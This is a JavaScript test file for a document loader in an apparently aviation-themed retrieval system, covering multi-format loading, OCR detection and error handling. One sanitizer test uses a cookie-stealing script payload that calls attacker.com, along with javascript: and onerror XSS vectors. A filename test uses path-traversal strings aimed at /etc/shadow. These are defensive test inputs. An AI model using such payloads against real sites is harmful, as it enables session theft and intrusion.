import test from 'node:test';
import assert from 'node:assert/strict';
import path from 'path';
import fs from 'fs';
import {
  loadDocument,
  loadCorpus,
  sanitizeFilePath,
  sanitizeFilename,
  sanitizeExtractedText,
  generateDocumentId,
  DocumentLoaderError,
  DocumentNotFoundError,
  UnsupportedFormatError,
  EmptyDocumentError,
  DocumentSizeExceededError,
  CorruptedDocumentError,
  SUPPORTED_FORMATS,
  MIME_TYPE_MAP
} from '../src/rag/documentLoader.js';
import { extractText } from '../src/utils/textExtractor.js';

import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const SAMPLE_CORPUS_DIR = fs.existsSync(path.resolve(__dirname, '../../data/sample_corpus'))
  ? path.resolve(__dirname, '../../data/sample_corpus')
  : path.resolve('data/sample_corpus');

test('Milestone 3.19: Document Loading & Multi-Format Intake', async (t) => {

  await t.test('Supported Format Loaders (PDF, DOCX, TXT, MD, HTML)', async (t2) => {
    await t2.test('should load and extract PDF procedure document (sop_sterile_cockpit.pdf)', async () => {
      const filePath = path.join(SAMPLE_CORPUS_DIR, 'sop_sterile_cockpit.pdf');
      const doc = await loadDocument(filePath);

      assert.equal(doc.format, 'pdf');
      assert.equal(doc.contentType, MIME_TYPE_MAP.pdf);
      assert.equal(doc.filename, 'sop_sterile_cockpit.pdf');
      assert.equal(doc.status, 'SUCCESS');
      assert.equal(doc.isScanned, false);
      assert.equal(doc.requiresOcr, false);
      assert.equal(doc.pageCount, 1);
      assert.ok(doc.charCount > 300, `Expected charCount > 300, got ${doc.charCount}`);
      assert.ok(doc.wordCount > 40, `Expected wordCount > 40, got ${doc.wordCount}`);
      assert.ok(doc.text.includes('Sterile Cockpit Procedures'), 'Should contain title');
      assert.ok(doc.text.includes('below 10,000 ft MSL'), 'Should contain altitude limit');
      assert.ok(doc.id.startsWith('doc_'), 'Should generate deterministic doc id');
      assert.equal(doc.metadata.sanitizedPath, 'documents/sop_sterile_cockpit.pdf');
    });

    await t2.test('should load and extract DOCX training manual (flight_crew_training_manual.docx)', async () => {
      const filePath = path.join(SAMPLE_CORPUS_DIR, 'flight_crew_training_manual.docx');
      const doc = await loadDocument(filePath);

      assert.equal(doc.format, 'docx');
      assert.equal(doc.contentType, MIME_TYPE_MAP.docx);
      assert.equal(doc.filename, 'flight_crew_training_manual.docx');
      assert.equal(doc.status, 'SUCCESS');
      assert.equal(doc.isScanned, false);
      assert.equal(doc.requiresOcr, false);
      assert.ok(doc.charCount > 100);
      assert.ok(doc.text.includes('AERO-SOP-742'), 'Should contain procedure ID');
      assert.ok(doc.text.includes('GO AROUND FLAPS'), 'Should contain standard callout');
      assert.ok(doc.text.includes('GEAR UP'), 'Should contain climb callout');
      assert.equal(doc.metadata.sanitizedPath, 'documents/flight_crew_training_manual.docx');
    });

    await t2.test('should load and extract Markdown checklist (emergency_descent_checklist.md)', async () => {
      const filePath = path.join(SAMPLE_CORPUS_DIR, 'emergency_descent_checklist.md');
      const doc = await loadDocument(filePath);

      assert.equal(doc.format, 'md');
      assert.equal(doc.contentType, MIME_TYPE_MAP.md);
      assert.equal(doc.filename, 'emergency_descent_checklist.md');
      assert.equal(doc.status, 'SUCCESS');
      assert.ok(doc.text.includes('Emergency Descent'));
      assert.ok(doc.text.includes('Oxygen Masks'));
      assert.ok(Array.isArray(doc.metadata.headings), 'Should capture markdown headings');
      assert.ok(doc.metadata.headings.length >= 2, 'Should capture at least 2 headings');
    });

    await t2.test('should load and extract Plain Text policy (fuel_reserve_policy.txt)', async () => {
      const filePath = path.join(SAMPLE_CORPUS_DIR, 'fuel_reserve_policy.txt');
      const doc = await loadDocument(filePath);

      assert.equal(doc.format, 'txt');
      assert.equal(doc.contentType, MIME_TYPE_MAP.txt);
      assert.equal(doc.filename, 'fuel_reserve_policy.txt');
      assert.equal(doc.status, 'SUCCESS');
      assert.ok(doc.text.includes('DISPATCH FUEL RESERVES'));
      assert.ok(doc.text.includes('Domestic IFR Fuel Requirements'));
      assert.equal(doc.isScanned, false);
    });

    await t2.test('should load and extract HTML bulletin (bulletin_ops_2024_08.html) with tags stripped', async () => {
      const filePath = path.join(SAMPLE_CORPUS_DIR, 'bulletin_ops_2024_08.html');
      const doc = await loadDocument(filePath);

      assert.equal(doc.format, 'html');
      assert.equal(doc.contentType, MIME_TYPE_MAP.html);
      assert.equal(doc.status, 'SUCCESS');
      assert.ok(doc.text.includes('Safety Directive OPS-BUL-2024-08'));
      assert.ok(doc.text.includes('Severe Turbulence Penetration'));
      assert.ok(!doc.text.includes('<html>'), 'Should strip html tags');
      assert.ok(!doc.text.includes('<style>'), 'Should strip style tags');
      assert.ok(!doc.text.includes('font-family'), 'Should strip css text');
    });
  });

  await t.test('Security & Untrusted Input Protection', async (t2) => {
    await t2.test('should never expose host filesystem paths in document metadata or errors', async () => {
      const filePath = path.join(SAMPLE_CORPUS_DIR, 'sop_sterile_cockpit.pdf');
      const doc = await loadDocument(filePath);

      // Verify no absolute host paths are exposed in sanitizedPath or filename
      assert.ok(!doc.filename.includes(':'), 'Filename should not contain drive letter');
      assert.ok(!doc.filename.includes('\\'), 'Filename should not contain backslashes');
      assert.ok(!doc.filename.includes('/'), 'Filename should not contain forward slashes');
      assert.equal(doc.metadata.sanitizedPath, 'documents/sop_sterile_cockpit.pdf');
      assert.ok(!doc.metadata.sanitizedPath.includes('Users'), 'Virtual path should not leak user directory');
    });

    await t2.test('should strip dangerous embedded scripts and javascript pseudoprotocols', () => {
      const maliciousPayload = `
        # Dangerous Document
        <script>window.location='http://attacker.com/steal?c=' + document.cookie;</script>
        <iframe src="javascript:alert(1)"></iframe>
        <object data="bad.swf"></object>
        <a href="javascript:doEvil()">Click here</a>
        <img src="test.jpg" onerror="alert('xss')" />
        Normal procedure text: Verify all hydraulic pumps are operating.
      `;

      const sanitized = sanitizeExtractedText(maliciousPayload);

      assert.ok(!sanitized.includes('<script>'), 'Should strip script tags');
      assert.ok(!sanitized.includes('window.location'), 'Should strip script contents');
      assert.ok(!sanitized.includes('<iframe'), 'Should strip iframe tags');
      assert.ok(!sanitized.includes('<object'), 'Should strip object tags');
      assert.ok(!sanitized.includes('onerror='), 'Should strip inline event handler');
      assert.ok(!sanitized.includes('javascript:'), 'Should neutralize javascript pseudo-protocol');
      assert.ok(sanitized.includes('Verify all hydraulic pumps are operating'), 'Should preserve procedure text');
    });

    await t2.test('should sanitize filenames against path traversal attacks', () => {
      const maliciousName = '../../../../etc/shadow';
      const sanitized = sanitizeFilename(maliciousName);
      assert.equal(sanitized, 'shadow');
      assert.ok(!sanitized.includes('.'), 'Should not contain traversal dots');

      const windowsTraversal = '..\\..\\Windows\\System32\\cmd.exe';
      const sanitizedWin = sanitizeFilename(windowsTraversal);
      assert.equal(sanitizedWin, 'cmd.exe');
    });
  });

  await t.test('Scanned PDF Detection (OCR Required)', async (t2) => {
    await t2.test('should identify scanned image-only PDF as requiring OCR rather than silently treating as complete', async () => {
      const filePath = path.join(SAMPLE_CORPUS_DIR, 'scanned_maintenance_log.pdf');
      const doc = await loadDocument(filePath);

      assert.equal(doc.format, 'pdf');
      assert.equal(doc.isScanned, true, 'isScanned must be true for scanned PDF');
      assert.equal(doc.requiresOcr, true, 'requiresOcr must be true for scanned PDF');
      assert.equal(doc.status, 'REQUIRES_OCR', 'status should be REQUIRES_OCR');
      assert.equal(doc.charCount, 0, 'Extracted text character count should be 0');
      assert.equal(doc.pageCount, 1, 'Should record actual page count');
      assert.ok(doc.metadata.ocrReason, 'Should provide informative OCR reason');
      assert.ok(doc.metadata.ocrReason.includes('scanned image or non-text PDF detected'));
    });
  });

  await t.test('Empty Document Handling', async (t2) => {
    await t2.test('should throw EmptyDocumentError for 0-byte file (empty_procedure.txt)', async () => {
      const filePath = path.join(SAMPLE_CORPUS_DIR, 'empty_procedure.txt');
      
      await assert.rejects(
        async () => {
          await loadDocument(filePath);
        },
        (err) => {
          assert.ok(err instanceof EmptyDocumentError);
          assert.ok(err.message.includes('empty_procedure.txt'));
          assert.ok(err.message.includes('0 bytes'));
          return true;
        }
      );
    });

    await t2.test('should return FAILED status when throwOnError is false for empty document', async () => {
      const filePath = path.join(SAMPLE_CORPUS_DIR, 'empty_procedure.txt');
      const result = await loadDocument(filePath, { throwOnError: false });

      assert.equal(result.success, false);
      assert.equal(result.status, 'FAILED');
      assert.equal(result.errorCode, 'EmptyDocumentError');
      assert.ok(result.error.includes('0 bytes'));
    });
  });

  await t.test('Corrupted Document Handling', async (t2) => {
    await t2.test('should throw CorruptedDocumentError for damaged PDF (corrupt_document.pdf)', async () => {
      const filePath = path.join(SAMPLE_CORPUS_DIR, 'corrupt_document.pdf');

      await assert.rejects(
        async () => {
          await loadDocument(filePath);
        },
        (err) => {
          assert.ok(err instanceof CorruptedDocumentError);
          assert.ok(err.message.includes('corrupt_document.pdf'));
          return true;
        }
      );
    });

    await t2.test('should throw CorruptedDocumentError for damaged DOCX (corrupt_manual.docx)', async () => {
      const filePath = path.join(SAMPLE_CORPUS_DIR, 'corrupt_manual.docx');

      await assert.rejects(
        async () => {
          await loadDocument(filePath);
        },
        (err) => {
          assert.ok(err instanceof CorruptedDocumentError);
          assert.ok(err.message.includes('corrupt_manual.docx'));
          return true;
        }
      );
    });
  });

  await t.test('Unsupported File Formats Handling', async (t2) => {
    await t2.test('should throw UnsupportedFormatError with supported formats list for binary telemetry (radar_telemetry_dump.bin)', async () => {
      const filePath = path.join(SAMPLE_CORPUS_DIR, 'radar_telemetry_dump.bin');

      await assert.rejects(
        async () => {
          await loadDocument(filePath);
        },
        (err) => {
          assert.ok(err instanceof UnsupportedFormatError);
          assert.equal(err.attemptedFormat, 'bin');
          assert.ok(Array.isArray(err.supportedFormats));
          assert.ok(err.supportedFormats.includes('pdf'));
          assert.ok(err.supportedFormats.includes('docx'));
          assert.ok(err.supportedFormats.includes('txt'));
          assert.ok(err.supportedFormats.includes('md'));
          assert.ok(err.message.includes('Supported formats:'));
          return true;
        }
      );
    });

    await t2.test('should reject unsupported format override', async () => {
      const filePath = path.join(SAMPLE_CORPUS_DIR, 'fuel_reserve_policy.txt');

      await assert.rejects(
        async () => {
          await loadDocument(filePath, { format: 'executable_exe' });
        },
        (err) => {
          assert.ok(err instanceof UnsupportedFormatError);
          assert.equal(err.attemptedFormat, 'executable_exe');
          return true;
        }
      );
    });
  });

  await t.test('Size Limits & File Existence Validation', async (t2) => {
    await t2.test('should throw DocumentSizeExceededError when file exceeds configured maxSizeBytes', async () => {
      const filePath = path.join(SAMPLE_CORPUS_DIR, 'fuel_reserve_policy.txt');
      
      await assert.rejects(
        async () => {
          // Set artificially small limit of 100 bytes
          await loadDocument(filePath, { maxSizeBytes: 100 });
        },
        (err) => {
          assert.ok(err instanceof DocumentSizeExceededError);
          assert.equal(err.maxSizeBytes, 100);
          assert.ok(err.actualSizeBytes > 100);
          assert.ok(err.message.includes('exceeds maximum limit'));
          return true;
        }
      );
    });

    await t2.test('should throw DocumentNotFoundError when file does not exist', async () => {
      const nonExistentPath = path.join(SAMPLE_CORPUS_DIR, 'non_existent_file.pdf');

      await assert.rejects(
        async () => {
          await loadDocument(nonExistentPath);
        },
        (err) => {
          assert.ok(err instanceof DocumentNotFoundError);
          assert.ok(err.message.includes('non_existent_file.pdf'));
          return true;
        }
      );
    });

    await t2.test('should reject directory paths as documents', async () => {
      await assert.rejects(
        async () => {
          await loadDocument(SAMPLE_CORPUS_DIR);
        },
        (err) => {
          assert.ok(err instanceof DocumentLoaderError);
          assert.ok(err.message.includes('is a directory'));
          return true;
        }
      );
    });
  });

  await t.test('Corpus Intake (loadCorpus)', async (t2) => {
    await t2.test('should scan directory of mixed formats and survive invalid files without crashing', async () => {
      const corpusResult = await loadCorpus(SAMPLE_CORPUS_DIR);

      assert.ok(corpusResult.loadedDocs.length >= 5, `Expected >= 5 loaded docs, got ${corpusResult.loadedDocs.length}`);
      assert.ok(corpusResult.ocrRequiredDocs.length >= 1, `Expected >= 1 OCR required doc, got ${corpusResult.ocrRequiredDocs.length}`);
      assert.ok(corpusResult.skippedDocs.length >= 3, `Expected >= 3 skipped docs, got ${corpusResult.skippedDocs.length}`);

      // Verify loaded docs include pdf, docx, txt, md, html
      const loadedFormats = corpusResult.loadedDocs.map(d => d.format);
      assert.ok(loadedFormats.includes('pdf'), 'Should have loaded PDF');
      assert.ok(loadedFormats.includes('docx'), 'Should have loaded DOCX');
      assert.ok(loadedFormats.includes('txt'), 'Should have loaded TXT');
      assert.ok(loadedFormats.includes('md'), 'Should have loaded MD');
      assert.ok(loadedFormats.includes('html'), 'Should have loaded HTML');

      // Verify scanned PDF was routed to ocrRequiredDocs
      const ocrFilenames = corpusResult.ocrRequiredDocs.map(d => d.filename);
      assert.ok(ocrFilenames.includes('scanned_maintenance_log.pdf'));

      // Verify corrupt and unsupported files were skipped cleanly
      const skippedFilenames = corpusResult.skippedDocs.map(d => d.filename);
      assert.ok(skippedFilenames.includes('corrupt_document.pdf'), 'Should skip corrupt PDF');
      assert.ok(skippedFilenames.includes('corrupt_manual.docx'), 'Should skip corrupt DOCX');
      assert.ok(skippedFilenames.includes('empty_procedure.txt'), 'Should skip empty file');
      assert.ok(skippedFilenames.includes('radar_telemetry_dump.bin'), 'Should skip unsupported binary file');

      // Verify stats
      assert.equal(corpusResult.stats.loadedCount, corpusResult.loadedDocs.length);
      assert.equal(corpusResult.stats.ocrRequiredCount, corpusResult.ocrRequiredDocs.length);
      assert.equal(corpusResult.stats.skippedCount, corpusResult.skippedDocs.length);
    });
  });

  await t.test('TextExtractor Integration & Backward Compatibility', async (t2) => {
    await t2.test('should extract text using extractText() utility for RAG ingestion', async () => {
      const filePath = path.join(SAMPLE_CORPUS_DIR, 'emergency_descent_checklist.md');
      const result = await extractText(filePath);

      assert.ok(result.text.includes('Emergency Descent'));
      assert.equal(result.format, 'md');
      assert.equal(result.isScanned, false);
      assert.equal(result.status, 'SUCCESS');
      assert.ok(result.charCount > 0);
    });

    await t2.test('should extract PDF using extractText() utility', async () => {
      const filePath = path.join(SAMPLE_CORPUS_DIR, 'sop_sterile_cockpit.pdf');
      const result = await extractText(filePath, 'pdf');

      assert.ok(result.text.includes('Sterile Cockpit'));
      assert.equal(result.format, 'pdf');
      assert.equal(result.pageCount, 1);
    });
  });
});
